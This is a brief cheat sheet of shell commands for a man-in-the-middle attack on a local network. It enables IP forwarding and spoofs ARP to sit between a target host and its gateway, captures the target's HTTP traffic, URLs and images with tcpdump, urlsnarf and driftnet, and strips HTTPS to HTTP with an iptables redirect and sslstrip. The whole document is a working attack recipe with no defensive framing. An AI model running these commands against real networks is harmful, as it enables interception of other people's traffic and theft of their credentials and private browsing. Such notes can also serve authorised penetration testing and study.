### Forward IPV4 traffic
```
echo 1 > /proc/sys/net/ipv4/ip_forward
```
 
### Send fake ARP packages
```
arpspoof -i <interface> -t <rhost> -r <gatewayIp>
```

### Dump TCP traffic
```
tcpdump -i <interface> -A host <rhost> and port 80 > <rhost.txt>
```

### Extract urls from TCP traffic
```
urlsnarf -i <interface>
```

### Capture images
```
driftnet -i <interface>
```

#### downgrade HTTPS to HTTP - redirect requests from port 80 to 8080
```
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
```

### -l = listen to port 8080
```
sslstrip -l 8080
```

